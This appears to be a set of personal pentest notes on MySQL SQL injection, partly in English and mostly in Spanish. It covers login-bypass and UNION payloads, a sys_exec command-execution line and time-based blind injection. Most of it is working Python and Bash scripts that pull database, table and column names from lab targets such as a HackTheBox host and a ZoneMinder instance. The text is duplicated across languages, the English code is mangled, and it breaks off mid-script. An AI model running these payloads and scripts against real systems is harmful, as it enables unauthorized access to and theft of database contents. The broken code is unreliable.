  
<mark style="color:orange">**IMPORTANT**</mark>  
Consider encoding in URL format (**urlencode**) the requests  

```sql
Request:    sql CREATE FUNCTION sys_exec RETURNS int SONAME customlib.so
urlencoded: sql CREATE%20FUNCTION%20sys_exec%20RETURNS%20int%20SONAME%20%27customlib.so%27
```  

Consider **coding in hexadecimal** the **values** passed **in function calls**  
To encode in hexadecimal: $ <mark style="color:green;">xxd -p</mark> <mark style="color:orange">[ | tr -d 'd' ]</mark>  

```sql
Original Request:  sql SELECT sys_exec('ping -c 2 192.168.49.204')
Encoding Command:  echo "ping -c 2 192.168.49.204" | xxd -p
Hex Coded Request: sql SELECT sys_exec(0x70696e67202d6332203139322e3136382e3439392e323034)
```
  
## Resources
  
##### MySQL Manuals (available functions x versions):  
  
[MySQL 5.7 Reference Manual Information Functions][mysql_info_func]  
  
##### SQLi Cheat Sheets  
  
[Pentestmonkey MySQL SQL Injection Cheat Sheet][pentest_mysql_inject]  
[Hacktricks MySQL SSRF][hacktricks_mysql_inject]  
  
  
## Interesting Information  
  
##### Comparison of Case-Sensitive Strings  

```
cast('<character>') as binary = cast('<character>') as binary
```  
  
  
## Exploit Vector  
  
A field where a value is entered that performs a query to a DB on the server.
For example a login form  
  
  
## Magic Statement  
  
In a login form, if the query is poorly constructed, this statement entered in the user field, the password field, or both, can provide access with the first user.  
  
```sql
' 0r 1=1-- -
```
  
## 'Error Based' Type Injections  
<mark style="color:orange;font-weight:bold;">Note:</mark>  
All the examples below are based on a scenario with a database named '**College**', containing a table named '**Students**', composed of **three columns** (id, username and password, in which we have entered **a record** with the values (1, d1ch0t0my, d1ch0123).

### Quick Test  

```sql
' order by 100-- -
```

### Description	 

If when entering in the injectable field \"<mark style="color:green;font-weight:bold">' order by 100-- -</mark>"  
It returns an error of the type "<mark style="color:blue">Unknown column '100'...</mark>"  
It can mean that we are in front of an '**Error Based**' type injection.  
Since the response is telling us that it does not know the column 100, which means that it IS processing our request.  
We can take advantage of this as a way of executing SQL statements to obtain information, etc.  

### Exploitation  

We can reduce the number of columns until we do NOT get this error, which will tell us the total number of columns that the database has:  
<mark style="color:green">' order by 3-- -</mark>  
Once we have found out the total number of columns, we will use the instruction '<mark style="color:grey">union select</mark>' to select all the columns and to list them:  
<mark style="color:green">' union select 1,2,3-- - -</mark>  
This should return a "label" for each column with the number we have entered, of the type:  

~~~ssh
+----+-----------+----------+
| id | username  | password |
+----+-----------+----------+
|  1 | d1ch0t0my | d1ch0123 |
|  1 | 2         | 3        |
+----+-----------+----------+
1 rows in set (0.000 sec)
~~~

With this we can replace one of the "tags" with commands that return information from the database.  
Some examples would be:  

#### Get the name of the database in use  

<mark style="color:green">' union select 1,2,database()-- -</mark>  

~~~ssh
+----+-----------+----------+
| id | username  | password |
+----+-----------+----------+
|  1 | d1ch0t0my | d1ch0123 |
|  1 | 2         | Colegio  |
+----+-----------+----------+
1 rows in set (0.000 sec)
~~~

#### Get the user who is running the database  

<mark style="color:green">' union select 1,2,user()-- -</mark>  

~~~
+----+-----------+-----------------+
| id | username  | password        |
+----+-----------+-----------------+
|  1 | d1ch0t0my | d1ch0123        |
|  1 | 2         | root@localhost  |
+----+-----------+-----------------+
1 rows in set (0.000 sec)
~~~

#### List all tables in the database  

<mark style="color:green">' union select 1,2,table_name from information_schema.tables-- -</mark>  

~~~
+----+-----------+----------+
| id | username  | password |
+----+-----------+----------+
|  1 | d1ch0t0my | d1ch0123 |
|  1 | 2         | Colegio  |
+----+-----------+----------+
1 rows in set (0.000 sec)
~~~

><mark style="color:yellow">Note</mark>: you can limit the list adding at the end of the query "<mark style="color:blue">limit n</mark>"  
>e.g:  
><mark style="color:green">' union select 1,2,table_name from information_schema.tables limit 1,1-- -</mark>  ← would list the first table.  
><mark style="color:green">' union select 1,2,table_name from information_schema.tables limit 2,1-- -</mark> ← would list the second table, etc.  


## Blind SQL injection Time Based  

<mark style="color:orange;font-weight:bold;">Note:</mark>  
All the examples below are based on a scenario with a database named '**College**', containing a table named '**Students**', composed of **three columns** (id, username and password, in which we have entered **a record** with the values (1, d1ch0t0my, d1ch0123).  

### Quick Tests  

In the user field of a login or after any variable that we consider vulnerable:  
<mark style="color:green;font-weight:bold;">AnyUser</mark><mark style="color:green"> ' or if(1=1, sleep(5),1)-- -</mark>  
If SQL injection exists it will wait 5 seconds.  
<mark style="color:green;font-weight:bold;">AValidUser</mark> <mark style="color:green">' and sleep(5)-- -</mark>  
If the user is correct (exists), and we have SQL injection, it will wait 5 seconds.  

### Descripción  

When we cannot see the error response from the server side, we can use the 'sleep(n)' instruction to verify if the injection exists based on the response time.  
We concatenate the instruction we want to verify with a 'sleep' by means of an 'if' conditional, so that, if the instruction is true, it will wait the seconds we indicate in the sleep.  

### Determining the DBMS Version  

You can check the DBMS version by checking what 'delay' function we have available.  

#### MySQL  
Version < 5.0.12 available the <mark style="color: green">BENCHMARK()</mark> function.  
Version >= 5.0.12 available the <mark style="color: green">SLEEP()</mark> function.  

#### PostgreSQL  
Version < 8.2 available the function <mark style="color: green">generate_series()</mark>  
	<mark style="color: orange">NOTE:</mark> If applicable, a custom <mark style="color: green">SLEEP()</mark> function can be created from the OS system built-in libc library.  
Version >= 8.2 available the function <mark style="color: green">PG_SLEEP()</mark>  

#### Microsoft SQL Server  

Delay function: <mark style="color: green">WAITFOR DELAY '0:0:5'</mark>  


### Example  

If we want to find out the name of a database (it could be a table, etc.) we can make queries to the DB of the type "the character number 'n' of the string containing the name of the DB, is it an 'a'?" and concatenate them with a conditional of the type "if so wait '5' seconds".  
If the execution takes 5 seconds, or more (there may be some variation, always above 5 seconds), we will know that indeed the character 'n' of the name is an 'a'.  
The syntax of this type of queries in SQL, for the database name, would be:  
<mark style="color: green">select username,password from Students where id = 1 and if(substr(database(),1,1)='a',sleep(5),1);-- -;</mark>  
Where:  
select usename, password from Alumnos where id = 1 → selects the username and password fields from the Alumnos table, from the database in use, whose id is 1.  
and → is the boolean operator to add a statement after it  
'if' → is the conditional operator to indicate "if the condition following it in parentheses is met do such a thing".  
substr → gets the value of the character 'n' of a string str, with a syntax like substr(str,n,1), in this case the first character of the string that is obtained by executing the command "database()" which in turn what it does is to get the name of the database in use  
='a' → equals to 'a' the character obtained by substr  
sleep(5) → tells to wait 5 seconds before continuing execution  


Automation  
We will create a python script to perform the server queries in an automated way.  
The script will send the requests to check the characters that make up the string that forms the name we want to find out one by one (the name length will be predefined) with all the abcedary and numbers from 0 to 9.  
If the answer takes more than the predefined number of seconds, it will mean that the queried character is correct (case insensitive) and will add it to a string 'result' which will be printed as the final result.  

Find Database Name  
The query would be: substr(database(),%d,1)='%c',sleep(5),1)  
Where:  
database() → is the SQL statement that returns a string with the name of the DB in use.  
%d → will be the position of the character that is being checked  
%c → shall be the position in the array of characters to be tested of the character being tested  
5 → will be the number of seconds to wait before proceeding with the execution (if it waits it is a match)  

sqli_pwner_POST.py  

```
#!/usr/bin/python
# -*- encoding: utf-8 -*-

import requests, time, sys, signal
from pwn import *

# function to control the program output when doing Ctrl+C
def def_handler(sig, frame):
log.failure("Exiting")
sys.exit(1)

# Definition of the function to be used when a Ctrl+C signal is produced
signal.signal(signal.SIGINT, def_handler)

# variable to store the victim URL
url = 'http://admin.cronos.htb/index.php'

# variable to tunnel queries with BurpSuite
burp = {'http': 'http://127.0.0.1:8080'}

# variable to store the characters to be tested
s = r'0123456789abcdefghijklmnopqrstuvwxyz.:*@#$%^&-_=()!¡\/{}[]'
# variable to store the results
result = ''

# function to check the time it takes the server to respond
def check(payload):
# variable to store the data format for requests.
data_post = {
# the values are obtained by parsing a query made with Burp a static value of 'test' will be passed
# static value of 'test' for the password and the value of the payload (which will be # passed as an argument to the function).
# passed as argument to the function) as the value of username
username': '%s' % payload,
'password': 'test
}

# variable that stores the value of the current time
time_start = time.time()
# variable storing the content to be sent as request
# the value defined in the url variable and the defined data are passed
# in the data_post variable
content = requests.post(url, data=data_post)
# variable storing the time value at the end of the request
time_end = time.time()

Translated with www.DeepL.com/Translator (free version)
```




















Cuando no podemos ver la respuesta de error del lado del servidor, podemos utilizar la instrucción 'sleep(n)' para verificar si existe la inyección en base al tiempo de respuesta.
Concatenamos la instrucción que queremos verificar con un 'sleep' mediante un condicional 'if', de forma que, si la instrucción es cierta, esperará los segundos que le indiquemos en el sleep.

Determinar la Versión del DBMS
Se puede verificar la versión del DBMS comprobando que función de "demora" tenemos disponibles.

MySQL
Versión <		5.0.12	disponible la función	BENCHMARK()
Versión >= 	5.0.12 	disponible la función	SLEEP()

PostgreSQL
Versión < 	8.2	disponible la función	generate_series() ← NOTA: Si es el caso, se puede crear una función SLEEP() personalizada desde la librería system built-in libc del OS
Versión >= 	8.2	disponible la función	PG_SLEEP()

Microsoft SQL Server
Función de demora: WAITFOR DELAY '0:0:5'


Ejemplo
Si queremos averiguar el nombre de una base de datos (podría ser una tabla, etc.) podemos hacer consultas a la BBDD del tipo "el caracter número 'n' del string que contine el nombre de la BBDD, ¿es una 'a'?" y concatenarlas con un condicional del tipo "si es así espera '5' segundos".
Si la ejecución tarda 5 segundos, o más (puede haber algo de variación, siempre por encima de 5 segundos), sabremos que efectivamente el caracter 'n' del nombre es una 'a'.
La sintaxis de este tipo de consultas en SQL, para el nombre de la base de datos, sería:
select username,password from Alumnos where id = 1 and if(substr(database(),1,1)='a',sleep(5),1);-- -;
Donde:
select usename, password from Alumnos where id = 1 → seleciona los campos username y password de la tabla Alumnos, de la base de datos en uso, cuyo id sea 1
and 			→ es el operador boleano para añadir una instrucción a continuación
'if' 			→ es el operador condicional para indicar "si se cumple la condición que le sigue entre paréntesis haz tal cosa"
substr 		→ obtiene el valor de el caracter 'n' de una cadena str, con una sintaxis como substr(str,n,1), en este caso el primer caracter de la cadena que se obtiene al ejecutar el comando "database()" que a su vez lo que hace es obtener el nombre de la base de datos en uso
='a' 			→ iguala a 'a' la obtención del caracter obtenido por substr
sleep(5)	→ indica que espere 5 segundo antes de continuar la ejecución


Automatización
Crearemos un script en python para realizar las consultas al servidor de forma automatizada.
El script enviará las peticiones para chequear los caracteres que componen el string que forma el nombre que queremos averiguar de uno a uno (la longitud de nombre estará predefinida) con todo el abcedario y los números del 0 al 9.
Si la respuesta tarda más de la una cantidad de segundos, predefinida por nosotros, significará que el caracter consultado es correcto (case insensitive) y lo añadirá a una cadena 'result' que será la que se imprimirá como resultado final.

Averiguar Nombre de Base de Datos
La consulta sería: substr(database(),%d,1)='%c',sleep(5),1)
Donde:
database() → es la instrucción SQL que devuelve un string con el nombre de la BBDD en uso
%d → será la posición del caracter que se está comprobando
%c → será la posición en el array de caracteres a probar del caracter que se comprueba
5 → será el número de segundos de espera antes de proseguir con la ejecución (si lo espera es que coincide)

sqli_pwner_POST.py

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests, time, sys, signal
from pwn import *

# Función para controlar la salida del programa al hacer Ctrl+C
def def_handler(sig, frame):
log.failure("Saliendo")
sys.exit(1)

# Definición de la función a utilizar al producirse una señal de Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# variable para almacenar la URL vícitma
url = 'http://admin.cronos.htb/index.php'

# variable para tunelizar las consultas con BurpSuite
burp = {'http': 'http://127.0.0.1:8080'}

# variable que almacena los caracteres que se probaran
s = r'0123456789abcdefghijklmnopqrstuvwxyz.:*@#$%^&-_=()!¡\/{}[]'
# variable para almacenar los resultados
result = ''

# función para comprobar el tiempo que tarda el servidor en responder
def check(payload):
# variable que almacena el formato de la data para las peticiones
data_post = {
# los valores se obtienen analizando una consulta hecho con Burp se pasará un valor
# stático de 'test' para la password y se meterá el valor del payload (que se le
# pasará como argumento a la función) como valor de username
'username': '%s' % payload,
'password': 'test'
}

# variable que almacena el valor del tiempo actual
time_start = time.time()
# variable que almacena el contenido que se enviará como petición
# se pasa el valor definido en la variable url y la data definida
# en la variable data_post
content = requests.post(url, data=data_post)
# variable que almacena el valor del tiempo al finalizar la petición
time_end = time.time()











# verificación del si la diferencia entre el tiempo inicial y el final es mayor de 5 segundos
if time_end - time_start > 5:
return 1

# variable para almacenar el progreso
p1 = log.progress("Database")
p2 = log.progress("Payload")

# primer bucle que recorre cada uno de los caracteres del nombre
# con un tamaño predefinido de 10
for i in xrange(1, 10):
# bucle anidado que recorre cada uno de los caracteres almacenados
# en la variable s
for c in s:
# variable que almacenará la sentencia a inyectar
# en este caso usaremos un "' or " para que se ejecute cuando la primera instrucción falle
# comprobará si el caracter %d de la cadena del nombre de la bbdd database() coincide con
# el caracter %c y si coincide esperará 5 segundo. Siendo %d=i y %c=c
payload = "' or if(substr(database(),%d,1)='%c',sleep(5),1)-- -" % (i,c)
# visualizamos el progreso de la generación del payload
p2.status("%s" % payload)
# verificamos si el retorno de la función check es 1, que significaría que ha tardado más de 5 segundos
if check(payload):
# añadimos el caracter a la variable result
result += c
# visualizamos el progeso de la generación del resultado
p1.status("%s" % result)
break

# imprimimos el resultado final
log.info("Database: %s" % result)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

sqli_CURL.sh

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/bin/bash

echo

# variable que almacena los caracteres que se probaran
char='0123456789abcdefghijklmnopqrstuvwxyz.:*@#$%^&-_=()!¡\/{}[]'

# variable para almacenar los resultados
result=""
whitechar=0

# primer bucle que recorre cada uno de los caracteres del nombre con un tamaño predefinido de 10
for i in {1..10}
do
# bucle anidado que recorre cada uno de los caracteres almacenados en la variable char
for (( k=0; k<${#char}; k++ ))
do
echo -e "\e[1A\e[KProbando caracter ${char:$k:1} en posición $result""_"

SECONDS=0
curl -X POST "http://192.168.169.52/zm/index.php" \
-d "view=request&request=log&task=query&limit=100;( SELECT * FROM ( SELECT( if( \
substr(database(),$i,1)='${char:$k:1}',sleep(5),1) ) \
)OQkj)#minTime=1466674406.084434'" &>/dev/null
DURATION=$SECONDS        


# verificación del si la diferencia entre el tiempo inicial y el final es mayor de 5 segundos
if [[ "$DURATION" -ge "4" ]]
then
result+=${char:$k:1}
if [[ "$i" -eq "1" ]]
then
echo -e "\e[1A\e[KEncontrado nuevo caracter: $result\n"
whitechar=0
else
echo -e "\e[2A\e[KEncontrado nuevo caracter: $result\n"
whitechar=0
fi
break
else
if [[ "${char:$k:1}" = "z" ]]
then
whitechar=$((whitechar+1))
if [[ "whitechar" -eq "2" ]]
then
echo -e "\nSegundo caracter en blanco"
echo -e "Fin del programa"
echo -e "\nDatabase: $result"
exit
fi
fi

fi
done
done
# imprimimos el resultado final
echo "Database: $result"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


sqli_pwner_GET.py

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests, time, sys, signal
# from pwn import *

# Función para controlar la salida del programa al hacer Ctrl+C
def def_handler(sig, frame):
log.failure("Saliendo")
sys.exit(1)

# Definición de la función a utilizar al producirse una señal de Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# variable para almacenar la URL vícitma
url = 'http://127.0.0.1:1234/index.php'

# variable para tunelizar las consultas con BurpSuite
burp = {'http': 'http://127.0.0.1:8080'}

# variable que almacena los caracteres que se probaran
s = r'0123456789abcdefghijklmnopqrstuvwxyz.:*@#$%^&-_=()!¡\/{}[]'
# variable para almacenar los resultados
result = ''

# función para comprobar el tiempo que tarda el servidor en responder
def check(payload):
# variable que almacena la url final de la petición
req = "%s?method=select&username=administrator%s&table=passwords" % (url, payload)

# variable que almacena el valor del tiempo actual
time_start = time.time()
# variable que almacenará la respuesta de la petición GET
content = requests.get(req)
# variable que almacena el valor del tiempo al finalizar la petición
time_end = time.time()
# verificación del si la diferencia entre el tiempo inicial y el final es mayor de 5 segundos
if time_end - time_start > 5:
return 1

print("\n[*] Iniciando fuerza bruta\n")

# primer bucle que recorre cada uno de los caracteres del nombre
# con un tamaño predefinido de 10
for i in xrange(1, 10):
# bucle anidado que recorre cada uno de los caracteres almacenados
# en la variable s
for c in s:
# variable que almacenará la sentencia a inyectar
# en este caso usaremos un "' and " para que se ejecute cuando la primera instrucción falle
# comprobará si el caracter %d de la cadena del nombre de la bbdd database() coincide con
# el caracter %c y si coincide esperará 5 segundo. Siendo %d=i y %c=c
payload = "'+and+if(substr(database(),%d,1)='%c',sleep(5),1)--+-" % (i,c)
# verificamos si el retorno de la función check es 1, que significaría que ha tardado más de 5 segundos
if check(payload):
# añadimos el caracter a la variable result
result += c
sys.stdout.write('\r'+'Resultado: '+str(result))
sys.stdout.flush()
# print(result)
break
print("\n\n[*] Ejecución finalizada!")

# imprimimos el resultado final
# log.info("Database: %s" % result)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~



Averiguar Tablas de Base de Datos Conocida
La consulta sería:
substr((select table_name from information_schema.tables where table_schema='BBDD_Name' limit %d,1),%d,1)='%c',sleep(5),1
Donde:
BBDD_Name → es el nombre de la BBDD que contiene la/s tabla/s de la/s cual/es queremos averiguar el nombre
%d → indicará el número de tablas de las que buscar el nombre (para poner un límite de tablas, por si hay muchas)
%d → será la posición del caracter que se está comprobando
%c → será la posición en el array de caracteres a probar del caracter que se comprueba
5 → será el número de segundos de espera antes de proseguir con la ejecución (si lo espera es que coincide)
sqli_pwner.py

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests, time, sys, signal
from pwn import *

def def_handler(sig, frame):
log.failure("Saliendo")
sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
url = 'http://admin.cronos.htb/index.php'
burp = {'http': 'http://127.0.0.1:8080'}
s = r'0123456789abcdefghijklmnopqrstuvwxyz.:*@#$%^&-_=()!¡\/{}[]'
result = ''

def check(payload):
data_post = {
'username': '%s' % payload,
'password': 'test'
}
time_start = time.time()
content = requests.post(url, data=data_post)
time_end = time.time()
if time_end - time_start > 5:
return 1

p2 = log.progress("Payload")

for j in xrange (0, 3):
p1 = log.progress("Tabla [%d]" % j)
# variable para controlar los espacios en blanco
cont = 0
for i in xrange(1, 10):
# Si ha sumado mas de 2 veces sin encontrar un caracter, se entiende que son caracteres en blanco, se da por finalizada la búsqueda para esa columna
if ( cont > 2 ):
break

for c in s:
payload = "' or if(substr((select table_name from information_schema.tables where table_schema='admin' limit %d,1),%d,1)='%c',sleep(5),1)-- -" % (j,i,c)
p2.status("%s" % payload)
if check(payload):
result += c
p1.status("%s" % result)
# si ha encontrado una coincidencia resetea el contador de caracteres en blanco para permitir espacios entre las palabras que formen el nombre
cont = 0
break

# si ha llegado a recorrer todos los caracteres significa que no ha encontrado ninguna coincidencia, se suma 1 a caracteres en blanco
cont += 1

p1.success("%s" % result)
# Borra el contenido de la variable result para comernzar con la siguiente tabla
result = ''
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

sqli_db_tables.sh

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/bin/bash

# DEFINICION DE COLORES PARA USAR EN SCRIPTS DE BASH
def='\e[39m'
red='\e[38;5;196m'
green='\e[38;5;46m'
yellow='\e[38;5;11m'
blue='\e[38;5;21m'
pink='\e[38;5;13m'
cian='\e[38;5;87m'
white='\e[38;5;15m'
grey='\e[38;5;240m'

# CAPTURAR Ctrl+C
trap ctrl_c INT

function ctrl_c(){
echo -e "\n[${yellow}!${def}] Detectado Ctrl+C"
echo -e "[${red}*${def}] Finalizando la ejecución..."
tput cnorm
exit 0
}

tput civis
echo

# ADAPTAR ESTOS VALORES
host='192.168.102.52'
tablelimit=100
charlimit=100

# variable que almacena los caracteres que se probaran
char='0123456789abcdefghijklmnopqrstuvwxyz.:*@#$%^&-_=()!¡\/{}[]'

# nombre de la Base de Datos conocida
bbdd="zm"

# variable para almacenar los resultados
result=""
whitechar=0
whitetable=0

for (( t=0; t<=$tablelimit; t++)) # limite de tablas
do
if [[ "whitetable" -ge "2" ]]
then
echo -e "[${yellow}¡${def}] Segunda tabla en blanco"
echo -e "[${green}*${def}] Fin de enumeración de TABLAS"
tput cnorm
exit 0
fi
echo -e "${white}Enumerando tabla ${cian}$t${def}\n"
for (( i=0; i<=$charlimit; i++))
do
if [[ "whitechar" -ge "2" ]]
then
echo -e "  \e[1A\e[K[${grey}-${def}] Segundo caracter en blanco"
echo -e "  Fin de enumeración de la tabla $t\n"
echo -e "  ${white}Tabla: ${green}$result${def}\n\n"
chrlen=${#result}
if [[ "$chrlen" -le 1 ]]
then
whitetable=$((whitetable + 1))
fi
break
fi

# bucle anidado que recorre cada uno de los caracteres almacenados en la variable char
for (( k=0; k<${#char}; k++ ))
do
echo -e "  \e[1A\e[KProbando caracter ${char:$k:1} en posición $i: $result""_"

SECONDS=0
curl -X POST "http://$host/zm/index.php" \
-d "view=request&request=log&task=query&limit=100;( SELECT * FROM ( SELECT( if( \
substr((select table_name from information_schema.tables where table_schema='zm' limit $t,1),$i,1)='${char:$k:1}',sleep(5),1 \
) ) )OQkj)#minTime=1'" &>/dev/null

DURATION=$SECONDS        


# verificación del si la diferencia entre el tiempo inicial y el final es mayor de 5 segundos
if [[ "$DURATION" -ge "4" ]]
then
result+=${char:$k:1}
if [[ "$i" -eq "1" ]]
then
echo -e "  \e[1A\e[KCaracteres encontrados: $result\n"
whitechar=0
break
else
echo -e "  \e[2A\e[KCaracteres encontrados: $result\n"
whitechar=0
break
fi
else
if [[ "${char:$k:1}" = "z" ]]
then
whitechar=$((whitechar+1))
fi
fi
done
done
if [[ "whitechar" -ge "2" ]]
then
whitechar=0
result=""
else
echo -e "  Se ha alcanzado el límite de 15 caracteres por tabla. Fin de enumeración de la tabla $t"
echo -e "\n  ${white}Tabla: $result\n\n"
whitechar=0
result=""
fi
done
echo -e "[${green}*${def}]Fin de enumeración de tablas"
tput cnorm
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Señalar que en este caso se pone la sentencia entre paréntesis, para que no de errores en la ejecución.
Se añade un contador de espacios en blanco (para aligerar la búsqueda).
En el primer caracter que no encuentre coincidencia continuará, para permitir nombres compuestos, con dos o más palabras
La segunda vez, consecutiva, que no encuentra coincidencia, entiende que son 2 espacios en blanco seguidos y entiende que ha finalizado la búsqueda.


Averiguar Columnas de Tabla Conocida
La consulta sería: substr((select column_name from information_schema.columns where table_name='Table_Name' limit %d,1),%d,1)='%c',sleep(5),1
Donde:
Table_Name → es el nombre de la tabla de la que queremos obtener las columnas
%d → indicará el número de columnas que queremos buscar (para poner un límite, por si hay muchas)
%d → será la posición del caracter que se está comprobando
%c → será la posición en el array de caracteres a probar del caracter que se comprueba
5 → será el número de segundos de espera antes de proseguir con la ejecución (si lo espera es que coincide)

¡¡ OJO !!! → Los Nombres de las Tablas SON CASE SENSITIVE ← probar con la primera mayúscula y el resto minúsculas
sqli_pwner.py

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests, time, sys, signal
from pwn import *

def def_handler(sig, frame):
log.failure("Saliendo")
sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
url = 'http://admin.cronos.htb/index.php'
burp = {'http': 'http://127.0.0.1:8080'}
s = r'0123456789abcdefghijklmnopqrstuvwxyz.:*@#$%^&-_=()!¡\/{}[]'
result = ''

def check(payload):
data_post = {
'username': '%s' % payload,
'password': 'test'
}
time_start = time.time()
content = requests.post(url, data=data_post)
time_end = time.time()
if time_end - time_start > 5:
return 1

p2 = log.progress("Payload")

for j in xrange (0, 3):
p1 = log.progress("Tabla [%d]" % j)
for i in xrange(1, 10):
if i >= 4:
if result == '':
break
for c in s:
payload = "' or if(substr((select column_name from information_schema.columns where table_name='users' limit %d,1),%d,1)='%c',sleep(5),1)-- -" % (j,i,c)

p2.status("%s" % payload)
if check(payload):
result += c
p1.status("%s" % result)
break

p1.success("%s" % result)
result = ''
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

¡¡ OJO !!! → Los Nombres de las Tablas SON CASE SENSITIVE ← probar con la primera mayúscula y el resto minúsculas
sqli_db_columns.sh <table_name>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/bin/bash

# DEFINICION DE COLORES PARA USAR EN SCRIPTS DE BASH
def='\e[39m'
red='\e[38;5;196m'
green='\e[38;5;46m'
yellow='\e[38;5;11m'
blue='\e[38;5;21m'
pink='\e[38;5;13m'
cian='\e[38;5;87m'
white='\e[38;5;15m'
grey='\e[38;5;240m'

# CAPTURAR Ctrl+C
trap ctrl_c INT


function ctrl_c(){
echo -e "\n[${yellow}!${def}] Detectado Ctrl+C"
echo -e "[${red}*${def}] Finalizando la ejecución..."
tput cnorm
exit 0
}

function usage(){
echo -e "\n${white}[${red}!${white}]${def} ERROR: no se ha proporcionado el nombre de la tabla a enumerar\n"
echo -e "${white}[${def}-${white}]${def} USO:\n\t${white}$0 ${yellow}<nombre_de_tabla>${def}"
echo -e "\t${grey}$0 Users${def}"
echo -e "\n\n${white}[${yellow}!${white}]${def} RECUERDA:\n\t Los ${white}nombres${def} de las ${white}tablas${def} son ${white}CASE SENSITIVE${def}"
echo -e "\tProbar con la primera letra en mayúscula y el resto en minúscula"
exit 0
}

if [[ "$#" -lt 1 ]]
then
usage
fi

tput civis

# ADAPTAR ESTOS VALORES
host='192.168.102.52'
tablename=$1 # pasar el nombre de la tabla a enumerar como argumento 1
tablelimit=100
charlimit=100

# variable que almacena los caracteres que se probaran
char='0123456789abcdefghijklmnopqrstuvwxyz.:*@#$%^&-_=()!¡\/{}[]'

# variable para almacenar los resultados
result=""
whitechar=0
whitecolumn=0

echo -e "\n${white}[${green}*${white}] --- Enumerando COLUMNAS de la tabla ${yellow}$tablename ${white}--- [${green}*${white}]${def}\n"

for (( t=0; t <= $tablelimit; t++)) # limite de COLUMNAS
do
if [[ "whitecolumn" -ge "2" ]]
then
echo -e "[${yellow}¡${def}] Segunda COLUMNA en blanco"
echo -e "[${green}*${def}] Fin de enumeración de COLUMNAS"
tput cnorm
exit 0
fi
echo -e "${white}Enumerando COLUMNA ${cian}$t${def}\n"
for (( i=1; i <= $charlimit; i++))
do
if [[ "whitechar" -ge "2" ]]
then
echo -e "  \e[1A\e[K[${grey}-${def}] Segundo caracter en blanco"
echo -e "  Fin de la enumeración de la COLUMNA $t\n"
echo -e "  ${white}Columna: ${green}$result${def}\n\n"
chrlen=${#result}
if [[ "$chrlen" -le 1 ]]
then
whitecolumn=$((whitecolumn + 1))
fi
break
fi

# bucle anidado que recorre cada uno de los caracteres almacenados en la variable char
for (( k=0; k<${#char}; k++ ))
do
echo -e "  \e[1A\e[KProbando caracter ${char:$k:1} en posición $i: $result""_"

SECONDS=0
curl -X POST "http://$host/zm/index.php" \
-d "view=request&request=log&task=query&limit=100;( SELECT * FROM ( SELECT( if( \
substr((select column_name from information_schema.columns where table_name='$tablename' limit $t,1),$i,1)='${char:$k:1}',sleep(5),1 \
) ) )OQkj)#minTime=1'" &>/dev/null

DURATION=$SECONDS

# verificación del si la diferencia entre el tiempo inicial y el final es mayor de 5 segundos
if [[ "$DURATION" -ge "4" ]]
then
result+=${char:$k:1}
if [[ "$i" -eq "1" ]]
then
echo -e "  \e[1A\e[KCaracteres encontrados: $result\n"
whitechar=0
break
else
echo -e "  \e[2A\e[KCaracteres encontrados: $result\n"
whitechar=0
break
fi
else
if [[ "${char:$k:1}" = "z" ]]
then
whitechar=$((whitechar+1))
fi
fi
done
done
if [[ "whitechar" -ge "2" ]]
then
whitechar=0
result=""
else
echo -e "  Se ha alcanzado el límite de $charlimit caracteres por columna."
echo -e "\n  ${yellow}Columna: $result${def}\n\n"
whitechar=0
result=""
fi
done
echo -e "[${green}*${def}]Fin de enumeración de COLUMNAS"
tput cnorm
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Señalar que en este caso se pone la sentencia entre paréntesis, para que no de errores en la ejecución.
Se añade un contador de espacios en blanco (para aligerar la búsqueda).
En el primer caracter que no encuentre coincidencia continuará, para permitir nombres compuestos, con dos o más palabras
La segunda vez, consecutiva, que no encuentra coincidencia, entiende que son 2 espacios en blanco seguidos y que ha finalizado la búsqueda.


Averiguar Valor de Campo Conocido en Tabla Conocida Basado en Columna ID
La consulta sería: substr((select columnaUserName from tablaUsers where id='%d'),%d,1)='%c',sleep(5),1
Donde:
columnaUserName → es el nombre de la columna que contiene los nombres de usuario
tablaUsers → es el nombre de la tabla que contiene la columna con los nombres de usuario
%d → indicará el número de usuario que queremos identificar (para poner un límite, por si hay muchos)
%d → será la posición del caracter que se está comprobando
%c → será la posición en el array de caracteres a probar del caracter que se comprueba
5 → será el número de segundos de espera antes de proseguir con la ejecución (si lo espera es que coincide)
sqli_pwner.py

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests, time, sys, signal
from pwn import *

def def_handler(sig, frame):
log.failure("Saliendo")
sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
url = 'http://admin.cronos.htb/index.php'
burp = {'http': 'http://127.0.0.1:8080'}
s = r'abcdefghijklmnopqrstuvwxyz0123456789.:*@#$%^&-_=()!¡\/{}[]'
result = ''

def check(payload):
data_post = {
'username': '%s' % payload,
'password': 'test'
}
time_start = time.time()
content = requests.post(url, data=data_post)
time_end = time.time()
if time_end - time_start > 5:
return 1

p2 = log.progress("Payload")

for j in xrange (0, 4):
p1 = log.progress("Usuario[%d]" % j)

# variable para controlar los espacios en blanco
cont = 0

for i in xrange(1, 10):
# Si ha sumado mas de 2 veces sin encontrar un caracter, se entiende que son caracteres en blanco, se da por finalizada la búsqueda para esa columna
if ( cont > 2 ):
break

for c in s:
